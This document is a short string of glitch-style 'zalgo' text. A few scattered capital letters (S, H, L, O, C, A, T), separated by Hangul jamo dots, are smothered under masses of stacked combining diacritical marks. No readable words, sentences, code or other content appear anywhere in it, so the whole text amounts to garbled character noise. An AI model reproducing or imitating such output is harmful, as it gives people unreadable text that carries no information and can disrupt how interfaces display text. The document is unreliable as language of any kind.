̧̢̨̨̨̨̡̢̡͉͓͙̤̰̱̮̘̱̥͎̪̖͙̥̣͖̟̠͙̻̼͖̺̙̪̮͔̼̟͓̠̟͖̠̠̮̺̰̙͕̳̩̩̝̥̯̳̺̬̤̯̤̗̻̘̳̹͍̱̙̤͔̺̙͖͚̦̰̻͓̥̗̼͖͖͖̠͎̲̖͉͖̞͇̺̺̙͔̗̜̯̲̙̖͎̥͎̞̬̜̲̤̮̱̤̲̰͔͚͍̬̙̘̱͜ͅͅᆞ̸̢̢̡̨̧̨̨̧̛̛̛̛̛̜̞̺̜̘̗̱̣͍̦̤͚͎̼͕̥̙͎̙͍̞͈̖̖̤̞͉͔̖͍̣̤̰̟̗̦̲͓͇̫̬̰̹͔̘͓̹̭̻̘͉̲̮̫͕̰̞̓̒̃̔̌͒̅̋̌̋͌̈́̽͗̑͑̓̍̍̍͆̉̀̈́̇̄͊̀́̌̉̔̃͋͆̄͆̎͒̓̈́͆̂͂̆͋͒̍͆̇͂͛̔̅̎̍̍͆̆͐́̄̀̄̃̿̈̇͒̄͒̈́̎͌̋̔̈́̾̌̓̋͛̋̾́̓͐̓̊͂̽̒̌͒͆̓̀̆̓̈̒̎̊͆̈́́̐̿͂͆̃̆̄̓͋̊͂͛͗̅̅͂̄͗͊͛̾̀̎̓͌̈́̃́̒̿̎̐͐͋̓̈́́̄͐̅̒̂̈́́̑͌̾͌͊͋̇̋́̀̈́̒̿̀̂̌̏̄̽͆̅̀̎̿̌̉̽̍̾̀̓̓̾́̔̊́̀̍͛̎̿͛̉̈̄͆̄̋̿͆̅͂̊̓̽̾̈́̍̿͂̕̕͘̕̚͘̕͘̕̚͘͜͝͝͝͝͝͝͠͠͝͝͝͝͠͝͠͠͝ͅͅͅͅᆞ̸̢̡̡̢̡̡̢̧̡̧̛̛̛̛̛̜̮̱͕͓̥̳̬̼̣͍̞̼̮̺͉̤͈͇̠̦͇͈͓͈̪̘̹̘͎̺̻̘̣̱̟͍͓̦̮͔̹̜̪̲̱̦̮̱̯̺̭͈̩̤͉̜̬͈̠͓̻̲̘̲̬̲͈̝͚͎̳̞̪̪̦̹̫̓̑́̄͆̏̂̆̉̓̑͑̋́͊̽̈́̄͆̓͗̿̐͑͑̎̈́́͊͛̂̑͌̉̓͌̀͂͆̃͆̒̅̊̆͊̄̂͐̈́͌͒̽͊͆͋̅͊͗͌̾̄͐̆̒͊̀͑́̒̄̊͒̒͆̓̽͛̿̐́͐̔̂̆̊͗͌̇̒͐̽̿̆͛̈̈̎́̋̋̇́̒̈̐͛̒̃͋͋̌͋̆̎̀̑̏͂̎̌̈́̌͌̅̓͒̎̏͂́̂͑̅̋̍̌̓̔͗͊͒̓̅͂́̓̀̎̔̏̈́͑͊̎́͊̒̉̀̌̅̾̂̀̍̄̎̑̒̽͛͂̋̈́̊͛̂̉̉̐̂̒͗̆̓́̊̇̂͛̈̀̀̓̓́̎̔̅̇̌̋̕̚̕̚̚̕̚͘̕̕͘̕͜͝͝͝͝͝͠͝͝͠͝͝͝͠͝͠͝ͅŜ̴̡̢̢̧̢̛̞̙͈̭̣̠͇̟͙̩̪̮̯̖̮̠̜̜̘̺̣͉̙͍̯̙̘̟̈͗͑̃͋͋̂̏͊̅̿̀̋͑̓̒̽͑̀̀̔̇̑͆̓́̀͐͒̓̿̄̐͂̉͐̈́̌̄̽̃̿́̕̚̕̚͝͝ͅᆞ̶̨̢̨̡̡̨̧̡̢̡̨̡̨̡̡̨̨̧̧̡̨̨̧̨̧̨̧̛̛̛̮͔̟͍̝̝̗̝̺̮̗̣̩̞͈͚̦̘̜̪̭̙̗͉̲̩̯̗̠̤̹̳̣͉̹̗̘̻͕̜̱̝̜̩̺̖̺͔̟̮̹̥̪̳̗̥̯̫̪͇͎͕͉̼͔̬̮̱͎̠̯̻̮͓͖̭̙̳͓͈͓̗͉̫͚̜̣̗̳̬̮͔͙̣͚̻̠̮͈̮̥͙͚̥̯̰̗͔͕̭̤̥̱̙̩̪̯̫̦̫͉͕̹̼͚̟̱̭̱̯̼͙̞͎̠̠̗͉̝̠̪̼͚̫̪͖͓̞̞͍̙͓̪̗̜̥̘̫̩̦̪̹̦͈͚̼̞͉̼̜̳̤͕̞̲̮̱̗̦̠̙͇̬̘͉̺̲͎̟͓̦̱̣͍͓͚̰̼̤̝͈̭̰̲͓̤̗̞͍̤̺͕̞̫͈̟͍̹̳͎̻̩̺͎̥̞̫̟̜̩̮̤̖̜̟̠͈̯͖̱̙̣͎̜̞̫̹̳̙͍̥̬͙̮̣̗̜̓̓͂̄̌́̈́̈́͌͒̎͂̉͂̈́̀͆̒̎̾̔̂̍̂̃͒̃͛͌̓̓͒̇̄̒̓͑̇͊̔͒̓̑̽̾̑̏́̈́̔͗̅̂͊̾͆͑̎̿̋͛͌̎̀̍̒́́̄͆͌͆́͐̎̌̆̈́̌̇̌͒̈́̋̌͗͋͌͊̀̿̈́͑̈́̋̐̈́̅́̿̑̓̎̍̎̔͊͒̀̀̈́̋̍͑́̿͂͂̇̾́͌͗̈̀́̈́͂͆̽̾̏̏̀̓͊͑̅͘͘̕̕̕̚̕̚͘̚͜͜͜͜͜͜͝͝͠͠͝͝͝ͅͅͅͅͅͅͅͅͅᆞ̵̨̢̧̨̧̡̧̡̢̢̢̧̨̱͍̼͚̞͓̗͖̰̦̥̜͇̣͉̬̞͖̠̮̫̘̮̘̟̗͉͉̬̯͎̖͎̲̘͇̜̟̖̭̟̫̝̝͍̠͉͍̝͎̥̟̹̙̱̼͓͍̠͚̟͚̞̘̳̦̟̞̩͔̘̠̠͕͈̙̖̱͖͇̘̠̣̖̫̻͉̘͎͔͇̻͉̖̤̬̮̜̝̞̭̩̰̱̰̖̲̱̭̞̗̹̞̰̬̖̣͓̙͚̮̠̺͕͈̙̜͖̜̙̤͉̱̦̘͓̭͍̝͈̞̲̞̣̖̟̫̰͎̺̺͚̠͓̫͈͖̤̟̮̱͓̻͙̮͖̰͓̄͐́̓̊̓̅̎̓̓͐̀̾͋̆̋͌̈̀̋̍̈́̏̔́̽́̓̐̅͂̃̐͂̕̚͘̚͜͜͜͜͜͠͠ͅͅͅͅḨ̶̧̢̢̢̡̢̢̢̡̡̡͈͈̪̪̮̹͙̤͍̞͓̘̹̦̼̬͚̗̭̮̳̬̮̪͔͈͓̥̦̦̤͇͎͙͕̱͔̹̭͍͔̭̤͎̬̝͍̳̪̰̤̫͔̰͔̮͚̞̩̯͕͖̙͖̗̭̳̲̟̤͎͎̹͙̣̥̯͓̝̥͕̬̯̫̯̦̙̣͈̤̯̥͉̰̺̲̫̬̖̻͔̝̠̫̙͓͖̣̪̰͙̗̳̦̯͓͍̪̲̺̮͎͔̙͙̯̙̪̟̬̱͓̹̫̩̺̼̭̗̻̣̪̣͙̩̦̲͚̾̓̏̉͆͜͜͜͜͜ͅͅͅͅᆞ̴̧̡̡̢̧̡̨̡̧̢̧̡̨̧̧̢̨̡̧̧̨̢̨̡̨̨̨̧̨̛̛̛̛̯͖͈̱̮̹͈̭͈͇̻̳̼͔͖̝̻̻̜̹̥̭̥̬̪̖̮̱̦̤̺̙̖͔͓̰͍̯̲͙͙̹̙̙͔̩͈̮̗̤̪̰͇͈͍̙̬̰̲̠͔̙͇̫̟̯̦̙͚͖̫̳͖̞̩͖̰̞̦̥̣̟̹̞̩̻̞͉͓̩̜̲̼̻̭̙̼͖̲̘͓̪̘̜̠̟̼̗̮̝̤͉͍̣͎̭̙͔̖͇̙̭͈͕̙̝̩̝͇̩̖̣̖̮̥͓̺̪̙̣̻̭̭̲̘̠̘̝̲͚̬͎͇̰̪̺̩̘̩̪̙̺͓͓̱͔͎̺͚̳̙͇̳̰̞̣͚͔̮͈̙̜̥͕̜͕̱̥͈̣͉̘͙̜͚͔̥̖̤̻̳̣̙̜̖̝̻̠̯̳̝̼̰͉̹̞͉̞̠͕̭͍͖̼͖̰̜͕̩̩͇͖̤̘̩̺̬̜̣͍̪̪͇̻̤̤̦̪͎̟͎͎̙͍͍͚̞̮̞̣͉̑̒͌̀̓̅͌́̈͊̊̃̋̏̈̎͛͋̿̇̌̓͌̉͆̓͐͐́̀̒̉͛̒̀́̎̋̅̆̽̾͗̈́́̎̆̃͆̈̋͗̐̋̑͗̒͊͊́͌̋͂̆̏̈́̍͋̀̆̈̎́̋́͊̂̀͛͆͊̐̍̈́̾̀̓̍͑̽̽̃̋͋̿̂͋̃̍̽͂̒̈́͆̀̀́̈́̏̈̉̋̓̒̂̄̒̑́̊̇̇̈́̏̽͑̿̇̎̋̋̎̽̂̏̀̒̓́̒͛̋̈́̇̃̉̌̒͛̄̈́̏͐̆̀̉̈́̄͋̌̐̆͑̐͑̀̈͗͋̌͒̅̃̈̈́̃͊͆̿̀̈́̍̔̄̑́͊͒̈͂͂̊̑̂̈̅͂̀̌̂̋̏́̇͒͛̌̑̀͊̄́̋̏̃͛͌̂͆̎͊̔̒͛͒̔͆̾̚̚̚̕̕̚̚͘͘̚̚̕͜͜͜͝͝͝͝͠͝͝͝͝͠͝͝͠͝͝͠ͅͅͅͅͅ ̵̡̛̮̤̜̠̮͚̞̖̲̹̺̯͈̮̪̪̳̬͖̹̩̟̲̱̥͇̣̠̠͕̟̗̩͙̺̫̫̝̮͕̯͓̮͈͇͚̰͊̍͌̓̃̊̇̽̐̿̄̅̀̓͋͐̾̽̈́̽̆̿͑͐͊͊́́͒̃̈̇̀̆̅̆̔̿̌̓̈́́͊̆͆̂̓̅͗̈́̾̐̓̇̌͑̂̾̈́̈́̌̑̏̀̉͋̀̈́͋͗̀̚͘̕̕͘͜͠͝͠͝͠͠͝ͅᆞ̵̧̡̨̨̨̨̧̛̛̛̛̛̜͖͔̠̮̰̲̰̳͕̖̤̙̥̹̼͎̪̜͖̟̙̬͕̘̟̠͙͇̩̲̫̠̖̗̦̬̣̺̣̼̪͓̜̰͉͔͉͓̱͇̱̜̭͍͓͙̳̪̫͚̩̤̰͎͇͎̘͎̲̫̯̭̱̻͓̪̲̪̙̮̺̰̘̳͈͙̱̟̬̜̠̬͖̻͈̰͓̰̘͉̖̖̯̲͔̪̯͍̼̩͖̜̙͔͕̞̘͍̗̺͔͇͖̖̖͚̲̘͙̫̀͗͛̈̐͒̎͗̐̀͆̓̎̌̅͗̀͂́̐̽͑̈́͆͋͐̒̈̑͐͐̎̊̉̄̋̈́͋͊̍̌͑͐̇̂̔̓̇̏̈́́̾̾͌̎̐̂́̎̾̈́̾̈́̏͘͘̚͘͘͜͝͠͝͠͠͠ͅͅL̸̨̢̨̧̢̨̧̧̨̧̧̡̡̢̧̧̡̢̹͉̰͇̰̤̲͎͈̩̼̥̙͖̰̳̹̺̺̱̖̞͕͍̠̰̞̞̰̙͚̰̺̪̹̼̥̬̙̪̮͍͈̞̞̩̮͓͈̗̟͉̳̣̟̮̩͈͎̘̠͖̗̟̟͖͓̯̠̺͍͕̳͍̥̥͙͈͓̩̣̤͖̰̖̣̹̹̤̠̩̫͕͖͕͈̝̰͙͍̮̱̟̬̩̦̻̬̜͇͓̜̮̮̗̗͖̬͇̙̞̗͍̘̺͕̥̦̣͕̱̯̝͉̹͍͕̱͉̂́͌̈́̆̓̃͊̏̌̈́̅͒̍̾̐̇̅͂̈́͌̔̂̋̏͗͜͜͝͠͠ͅͅͅͅͅͅᆞ̸̢̡̡̨̨̢̧̨̡̢̡̢̢̢̡̧̧̡̢̡̧̨̨̨̢̡̧̨̨̨̡̨̧̢̧̛̛̛̛̛̛̛̗̩̭̳̩̳̯̭̪̬̜̙̟̱͉̹̲̖̰͍̮̩͍̰̘͙̟̬̞̳͔̘̜̞̗͉̪͖͈̳̩͈̞̮̱͖̫̜͇͕͎̜̱͙̠̖͚̝̤͚̱͈̳̺͓̲̻̞͙̟̻̩͓͚̩̖̰̟̟̲̩͔̱̗̼͉̻͇̣̫̪͓͖͖͈̝͔̟̺͙͓̗̗̝̻̣͓͎͉̬̯͎̤͕̬͖̳̺̮͍͇̲̪̮̠̻͚͖̪̯̲͉̜̩͍̥̻̫͖̦̝̥̤̤̖̼̥̙͖̺͓̤͔̦̝̱̰̜̱͖͖̮͈͕̻̳͔̻̙̱͕̰͇̹̗͚̼͚̭̖̭̻͚͓̣̤̖̪̤̺̪͎͇̤͖̤̪͈̗͍̪̭͎̪̰̜͇͚̭͔̼̰̩̞̳̼̱̙̣̮͔̬͇͚̼̝̖͇̟̳̥͚̗̞̘͋̏̉̈́̐͊̌̌̔͐̓̅̆͑̉̒̄̀̊̈́̈́̐̇͗̅̈́̑͊̇̊͌̆̈́̀̇̔̿͑̆͌͑̄͆̃̅͌͊̾̉̅͌̍́̋͊̎̋͋̋͊͗̀̊̾̉̈̅̇̅̿̔̍̽̒̽̍̌͐͊́̑̒̄͗̑̑̿̈̏̊̀͐̄͂͆͋͑̄͌͆̃̇̽̐̍̌̈́̂̈́̌̽̈́̿́̇̀̌̅͂̿̒̊̂͛̐́͑̄͋͑͊̍̌̂̋̐͂̑̄̎̊̃̍̇̎̔̉͒̚̕͘̚̕̚̕͘͘̕̚͘̕͜͜͜͜͜͠͝͠͠͝͝͠͠ͅͅͅͅͅᆞ̷̡̨̡̨̨̢̡̡̨̨̡̡̧̢̢̛̛̛̛̝̼͕͈͍̞̠̜͍̯̯̭̟̦̜͖͕͎̳̺̲͎͔͈̘͉͙̖̻̠̟̪͈̯͈͙̤̰̘̯̠̦̟̥͎̜̬͔̜̖͈͍̗̮̺͉̗͙͚̥̞̗̻͕̱̤̘̪̪͓͍̙̩̺̲͕̩͍̖̱͍̙͙̖̫̲̫̼͇͇̳̤͇̲͓̠̠͖̫̰̼̜̙̬̺̰̱̗̙͇̻̱̯̺͉̠͚͉̯̝̗̹̤̲̏̂̓́͑͐̄̌́̄̓̾̇͗̊͆̏̆̈͗̎̎͌̓̀͒́̽̑̍̂́́̎͂̓́̂͒̂̄̑̒̿́͋̅̏̋̌̐͌̊̑̐̎̀̀́͊̌̑̂́̅̒̔̆͆̍͒͋́̀̊̌͌̍̇͂͌̅͛̽̒̓̏̋̌̌̾̇͆̆͌͂́̑͆̐̋̇̇̿̏͛̀̓͛̈́̀̈́̈̈̀͑̀͂̈́̏̒̓͋̋̉̿̈̇̊̒͗̀͐̇̑͛͆͐̔̒͐̍̋̀̍̃́̓̓̐̌͋̎̽͒̔͛͆͛̉̅̓͋̃̆̆́̅̍̀̈́͌̑̓̀͂̈́̎́́̐̊̐̽͐̈̅̈̏̌̐̊̈́͌͛͘͘͘̕̕͘̚͘͠͝͠͝͝͠͠͠͝͝͠͝͝͝͠͝͝͝ͅͅͅͅͅƠ̵̧̧̧̨̧̧̡̡̧̢̧̨̨̨̧̢̨̢̢̡̢̢̡̨̨̧̢̛̺͕̳̹̗̲̱̙͎̥̥̼̭̥̟͇̮̺̥͖̹̖̗̘̰̘̞̲͕̗̣̣̭̳̟͍͇̪̠̗̱̻̫̬̖̳͇̺͉̳̘͎͍͚̙̲̖͚͖͙̣͍̙̠̱͎͖̼̜̦̲̻̙̮̞͙̩͖̪̖̼̜̮̤̲̠͎̪͈̝̩̻̤͚͉͍̲͉̤̪̠͙̱̫̬͖͖̭̬̣̟̻͓̗͇͚͖͇̪̣͇͍͍̼̟̰͚̳̻̱̖̦̠͇͍͍͖̘̘͙̹̘̤͎̤̭̟̱̹̣̠̪͈̝̠̩̯͖͖̺̠̟̙͚̹͇̼͚͕̣͕̲̪̭̞̱̯̰͓͔̻̠̱̻͈̩̙̘͎̮̝͓̬͍̼͕̟̼͙͓͍͙̜͉̺͔̱̹̯̪̗̰̥̯̫͉͓̭̤͕̮̝̘̭̺͍̺̮͉͉͎̙̘̠͍̙͖͚͌̓̾̏̈́̿̆̋̍͑̈́̽̉̿̈́̽̏̀͋͗̍̅͋͆̓̾̎̐͌̆͒̂̂͛̍̍̈́͋͗͋̃̐͌̈́̍̐̆̌̌̉̊̎͛̓̒͑̍̈͂́̃͛̈͌̆͋̔̐̆̅̔̎͐̊͗̒͗̀́̑̾̍̔͐̋́̓̓̔̈́̾̓̓̔̋̅̑̂́͋͊̈̌̈͋̆̔͆̈́̑̑̉̀̚̚̚̚͘͜͜͜͠͝͝͝͝ͅͅͅͅͅͅͅᆞ̵̡̡̧̧̡̢̨̨̢̡̨̧̧̧̡̢̨̢̢̧̡̨̡̧̻̫͈̠̣̝͎̖̹̺͚͕̖̳̺̦̭͕͉͕͉̜͓͚̟̣̞̩̜̤̯͍͈̗̲̜̩̤̩̺̰̬̳̣͍͍̘̯̣̤̮̯̠̗̘͇̗͖̭̥̰̝̣̫̞̬̹̺̬͕͉̰̣͍̞̖̣̤̖̻̹̼̟̟̘͔̱̙̹̱͔̬͎̖̩͙̯̩̥͉̳͍̩͔̝̟̖̝̥̜̝̳̪̹̩͙̜̱̩̮̻̱̪͉̭̘̱̥̞̹͈̲̠͖̝̰̻̼̘̖̝̘͙͓̣̭͔̥̥̼̦̹̠̩͈͍͈̳̺̣͓͓̰̬̤̲̥̩̱͚̪̠̺̦̘̠͓̖̜̖̭̹̼͙͓̭͖̰̖͕̼̞͕͎̬̩͇͔̭̻͙̞̤̬̫̣̘̼̼͈͇̼̖̺̫̙̠̙͈̥͕̣̜͉̣̯̭͚̜̯̻̹̥̲͙̥̞̲̓̂̎̄̇̑̔̌̈́̒̊̀̾̉̎̕͜͜͜͝͠ͅͅͅͅͅͅͅᆞ̵̧̧̨̢̨̡̢̨̡̧̡̨̨̡̡̢̢̧̨̨̡̛̛̫̰̙͈͈̦̯̙̙̬̤̤̲̳͙̞͇̥̻͇̦͕͉̗̠̬͓͙̝̦̯̳͙͎͈̹̼͙̞̞̗̼̗̺͕͕̠̳͔͖̝͎̬͇͙̩͎̲͈̫̱̥͈̹̦̜͓͎͎͉͍̱̞̭̦̩̱̮̜̮̟͍̺̮̳̭͎̺͇͇̦̝̟̱̙̰͈͍̺͇̯̭̥̥̦͚̘͚͙̼͕̹̪̲̪̱͚̹͙̤̤͎̜͓̣͓̗̘͕͙̘̹̘̞̖̰͖̩̗̰̪̪̝͉̼̱̜̬̻̭̙̗̙͔̺̮̺̠̯̫̥͉̦̖̫̲̳̹̤̭̱̮̗͈̼̤̻̹͇̭̟̜̳̣͕̬͖͓̖̗̤̠̲̞̙̲̜̖̖͚̬͉̯͖͖̼̣̦͕͔̣̭͖̮̻̠̝̗̹̟̮̫̘̳̻͙̩͚̰̺̯̤͕͉̭̻̯̝̺̼̘̐̾͆͋͒̊͂͊̑̑̈̐͗̔̐̾̀͋̂̾̎͊̀͗͆̂̾͛͐͂̇̄̾̄̓̓̐̈̈́̉̓̈́̑̈́͌̊̈́̈́́̅̐͊͆͆̑̆̉̓̓̉̀̏̀́͐̂͂́̓͛̓̅́̍͂͘͘̕̚̕̕̚͜͜͜͜͜͜͜͜͝͝͝͝ͅͅͅͅͅͅC̷̢̛̛̛̛̛̛̛̛̛̠̟̫͖̪̿̇̅̋͛̆̆̓͊͆͐̄̍̇̆̾̀̎̾̈͆̈́͑͛̾͊̓̀̍̉̓̀̎͋͌̔͒̆̌͋̒̌͛͊́̋̐̅̓̅̽̅̑̒̉͌̑̓͊̊͊̌̐̋͋͂̽̔̿̌̂͋̽̈́̌͂͐͂̈́̄̌̈́͋̍̌͋͊́͂̿͌́̀͊̿̈̀̂̽̈́̈́̅̀̉̑͊͂̈́͋͑͗̃͂͗͛̇̍̌̓̀̏̑́̔̃̓̈́͆́͋̈́͑̒͐̇͌̔̐̀̐̍̽̓̈́̎̎͊̾͛͊̓͐̋͒̒̽͗̊̀̀̽̉͐̀̈́́̏̄̃̏̅̀̃͊̈́̈́̃̔̄̾͑͆̄͆͂́̈́̐̈́̆͌̅̕̚̕̕̕̕̚̕͘̕̚̕͠͠͝͝͝͝͠͝͠͠ͅᆞ̷̡̡̡̢̨̢̛̩̺̰͓̜̲̙̮̤̱͓̻̫͙͓̘͔̟̮̫͚̲͖͈͙̤̠͎̘̥͕̭̼̗̘̖̳̠̦͕͚̝̺̟̦̤̫̣̣̳̜̣͓̱̘̹̟̲͕͍̦̣͚̘̤̈́͊̋͊͌͋̄̎̌̿̀̐͒̂͌̀́͛̓͑͋̿̑̋͗̿̅̐̀̒̇̎̔̀̈́̍̊̾͑̀̌̿̋̉̂̈́̈́͆̈̃̿̆͑̔̾͌̐̈́́̑̉͒̒̆͑́̔͐̉̆̈̎̈́̇͆̑̔͂́̑̑͒̐̀̑̂̎́̆̓̉̀̍̇̇̚̕̕͜͜͠͠͠͠͝͝͝ͅᆞ̴̢̡̧̢̢̢̨̨̛͈̗̣͚͔̪̝͎̫̺̯̺̭͓̬͚̰̭͈̰̠̦͕̘̟̱̬̯̲̦̭͇͎͎̲̞̮̝͈͕̗̻͎̱̼̳̻̦͓͚̭͈͎̰̪̖͍̗̬͓̤̙͉̙̣̱̹̯̖͈̩̳̪̺̖̞̗̯̩̻͖̩̱̱̮̫̥͕̟͕̤͔̻̠͇̣̦̣̩͕͖̝̞̜̯̜̦̭̥͓̣̬̥̖̪̼͍̪͊͆̍̇̈́̎͛͐͂̄͒̔͋̄͒̽̓̒̏͊͊͑̔̃̓́̎̑͛͊̔̈́̌̑́̈́͐̾́̔̿͐́͐̍͌́͒̉̊̎̏͛̆̐̂̎͑͛͗͛̍̊̽̿͋͆̾͗̐̅̇̾̆̇̑̇́̊̾̍̏̇̉̌̿̂́̑̇͂̀̍̍̊́̾͗̂͐́̈́̆̇͌̒́̏̅͂̾̈̅̎̉̇̈́̍̋̈̊͘̕͘͘͘̕̚͘͜͜͜͝͠͝͠͝͠͝͠͝͠͝͠͠͠ͅĄ̶̧̧̧̡̧̡̧̡̡̧̨̢̧̧̧̧̧̡̛̯̞̤̰͈̭͇̹̘̦̯̲̩̜͖̘̭̹͓̲̲̭͖̜̭͕̠̳͕̥̭̗̮͈͔̦̗͖͈̬̼̝̱͙͓͈̗̮͚̼̫̝̣̰̪̪̘̝̰̦͎̦͇̙̻̠̟͇̞̦̭͈̱̖͓͔̥͉̬̣̠̘̟͕̞͔̤͇͕̘̻̖͈̳̺͔̳͇̙̼͎͍̮͈͇͔̠̞̖͙̰̥͕͔͍̻͉͇̪͉̝̔͋̍͒̒̈͗͊̈́͌̇̃̂͒̃͗͂̃̍͐͜͜͜͜͜͜͝ͅͅͅᆞ̷̡̨̡̨̢̡̢̧̡̢̢̢̧̢̢̡̡̧̡̨̡̛̛̛̛̛̛̼̩̮̭̰̞̹̫̝͍͎̥̗͈̲͔̲̘͔̻̫̝̖̦͖͖̯͙̣̱̲̗̭̗̝͖͎̤͓̹̙̠͚͔͎̖̱̣͔̻͕̥͚̖̦͇͉͎̪̬͇͚͎̩̳͓̝̘̳̮͕̘̫̻̹̞̙̫̦͚͉̙͚̣͖̰̭̖͉̗̱̲̘̜̫͇͚̖͈̰̝̤͚̣͔̪̺̳̱̤͍̪̥̠̠̻̝͈̹̬̞̬̪͕͔̘̲͖͍̳͇̣̲̜͚̩̰̤̻͉̭̞̤͎̺͚̗̟̝̫͕̬̼̣̪̤͇̩͇̝͕̠͓̘̖͉͎̜͖̜̳̖̰̦̠͚͉͖̖̬̟̮̦̠͔̯̼͓̱͖̱̫̭̤͔̰̻̙̫̬̮̳̭͎̟̭̯̙̭̩̖̩̼̻͎̮̗͎̝͙̖̠͙͚̙̣͔͙̞͕̤̰̖̖̭͚̰̲̳̜̼̤͍͚̙̦͕̣̰̝̲͈̫̦̲̰̜̯͍̟̠̀̍̄̏̀͒͌͆́͂͆̓̆̃̔̀̄͗͊̍̈́́̅͆̌̈̇̏̃̇̎̀͗̆͂͛̐̍̃̑̓̈́͌̈́͌̈́̊̐̽͗́̿̆̇̑͆̋͒͌͒̀͑͐̊̓̃͑͌̅̈́́͋̈́̏́̿̊̅̐̂̎̏͋͆̐̌̌̑͋̀͒́͂̊̋̃̑̊́̀͋̓͑̃̾͑́͒͒̒̓̈́̈́̐̊̋̇̍́̊͐͐̎͛̏̈́͆̅͒̅̐̈́̿̐̐͆̑͆́̆̑̈́́͊́̊̐͒̊̾́̀͋̿̚͘̚̕̕̚̚͜͜͜͜͜͜͠͝͝͝͝͝͝͝͠͠ͅͅͅͅᆞ̶̡̨̨̢̡̢̢̢̨̨̨̡̧̡̛̛̛̛̯̘͎̩͙̠̺̞͓̳̯̣̰̩͉̞̘̱̖̹̳͓̘̱̳̘͈̟͉̳̝̲̫̤̖̜̜͕̬͓̦̩̫̙͙̥͖͙̹̝͎̻̪̻̭̩͇̜̙͓͈̞̹̺̣͉̭̜̪̦͔̳̩̮̥̺̳̞͓̪͙͓̙͓͈̞̹̦̙̲͕̣͈̯̻͈͕̟̻͙̞̥̼̰̰̬̺̗͎͖̤̞̤̞̹̙͚̞͍̱̦̰̻̜̹͙̘̳̹̘̠̰̼̰͕̲̪̲̘̻̜̣̥͔̣̮͖͇͇̖̜̰̻̲̜̯̖͇̝̹̳̣̳̠͉̻͎̻̖̰̫̘͕̠̬̲̱̤̪̟͓̳̻̺̤̻̦͍͈̳̱̦̲͕̱͍̻̖̲͈͔͉̲̣̠̤̜͙͍͍̩̲͚̖͈̳͈̻̪̮̗̪̰͍̥̲̻͔͕̟̻̱̎͂̊̍͌͆̿̃̈́͆̎͐̄̑̿͆̀̊̆̄̓̈̈́̾͋̂̋̊͌͆̂̓̎͛͒̀̉̊̈̈̅͛͐͒̇́̇͊͒̑͂̍̇̌̆̾̌̎̉͋̆̎͛͋͛̀́̊̀̀̉̀̎̑͌̆͛̀́́͆̂̒̈́̑́̀̊̽̍͛͆̄̑͌̇̔́͌̊͒͋̉͌́͗͒̃̔̄͌̓̇͐̽̃͐͂̽̈́̏̾̌͒́̈̅͊̋͗̋̏͌̏̈́̿̓͛͗͗͂̅͗̔̉̓̃͂͒̆̈́͑̽͊̅͗̉͑̄̏͌͌̈̋̓̉̉̂̓̆̌́̐̈́̉̿̌̎͊͛̔̐̓̈́͆̀̒̑͗́̌́̾̀̄̏̉̑͆͊̏̾̍̉͆̋́͊̏͒̒̃̔̊̂̑͑̂̂͐̈́̈́̊̔̋̐͒͑̑̋͒̔̋̈̾͐̅̋̉̅̎̈́͌̕͘̚͘͘͘͘̕̕̚̚͘̕̚͘͜͜͜͜͝͝͝͝͠͠͝͠͝͠͠͝͠͠͠ͅͅͅͅT̶̡̢̧̡̢̨̧̡̧̧̨̧̢̡̢̨̧̢̧̧̨̨̡̨̧̢̨̢̧̛͈̲̜̼͙͇͇͔̱̳͍͕̳̖͎̼̯̘͎͕͓͍͎̼̻̳̗̝̬̼̞̣̲̹̥̼͚̹̻̠͍̼͎̜̲̳̫͔͉̠̳̜̘͕͙̰̙͍̬̱͖̤͍̲̙͎͔̱̗̮̮̺͎͔̪̟̝̮̱̘̳̹͓̲̜͍͇͕̝̟̠̳͖̻̤̹̱͔̱͕̟̙̻͕̤͕̫̙̘̗̭̰̜͔̯̮͓̤̰̳̝̠̞͚͕̮̼̤̱̥͎̝̪̹̟̘̺͖̲̼̣͎͔̪̺̩̹͉̤̮̳̜̟̣͈̟͓̖̼̣̙̪̬̪̻̠̙̱̹͎̣̗̩̩̼̗͚̰̟̯̳̫̜͉̗̦̹̖͈̮̳͙͕̠̞͇͓̼̗̼̠̲̪̬̤̤̠̳̙͕̯̜̙͉̥̩̼̫͉̮̹͕̞͉͇͈͕͎̹̙͕̻͖͕͔̯̣̻͉̼̪̺̲̳̰̼̹̦͓̜͙̬̪͉̖̳̋̇̍̆͛̈͂̄̽̏̇̌̍̃̂̍̈́̊̌̌̃̔͂͌̈́͑́͒̈́̒͆́̉̎͗̑̀͒́͋̅̃͌̌͂͐͋̌̅̎̇̃͑̈́̉̿̓͋̏̇͊̈́͛̃̉̊̀̄̆̈́̃̓̾͂̽͊̓̋͛̉̈̈́̆̑͂̅̔̀͌̑̀͐̉̈́̓͐͊͒̍̅̓̎̈͐͊͗̕̕͘̚͘͘͘͜͜͜͜͜͜͜͝͝͝͠͝͠͝ͅͅͅᆞ̴̨̨̨̨̡̢̢̢̡̡̨̡̡̨̢̧̡̛̩͈̫̼̠̜̞̠̦̠͓̠̤̟͇̯̻̭͓̭͕͉͈̖̳͎͚͎̠̰͖̟̳̘̬̮̙̝̬̰̳̲̝̙͚͕͖͇̘̪͉̼̼͉̪̜̟̞̹̼̼̼̗̦̲̦̟̘͔̲̗̬̙̗̫͖̟̻̝̣̜̺̳͇̯̗͚̙͎͙̯̞̯̙̫̹͙͚̟͎͚̣̬͎̹͍͈̪̯̞͚̭͚͚͔̰͎̰̘̱̺͚͇͍̘̦̗̼̟͚̞̟̰͚̙͍̫̠̫̪̠̬̟͇̘͎̲̭̙̤͚͖̩̮͉̲̪̣̞̩̞̹͎͚͍̜̫̞̥̳̭̯̰͍͉̜̟̜̟̝͎͕̻̞̩̻̬̼̱̭͉͖͚̖͓͇͇̘̫̺̫͈̣̝̠̼̥̋̀̈̑͑͐͊͆̾̈̈̒̏̌͌̾̌̅̎̂͌͂͌͐͆̉̓̃̈́̎̽͆́̌̒͌̀̆͗͌̆̾̿͑̂̋̒̇͊̔̾͐́̆͌̈͐̓̐̈̋̇̋͊̈̾̌́̉́̌̎̈͗̄̈͗̈́̏̉͌̓̑̏̒̅͒͆̑͊̈́̐̿̈̀͐̋͐̽́̾́͒̍͗̓͛́͒̈́̐̌͊̽̂̀̊̓̊̈́͊͋̈́̄͋̽͊̐̈́̿̎̈́̍̓͛̆̈́̐̊̽̆̽́̿̐́̽̍̔̀̃̾̋͆̈́̈̏̇̈́̉̆̅̽̽̒̈͛̑̍̌̾̾̂̀̂̀̅͛̃̽̿̾̚̕͘̚͘̚͘̚̚̕̕̚̚̕͜͜͜͜͜͜͜͝͠͝͝͝͠͝͝͠͝͝͝͝͝͝͝͝ͅͅͅͅᆞ̵̽̿͘͝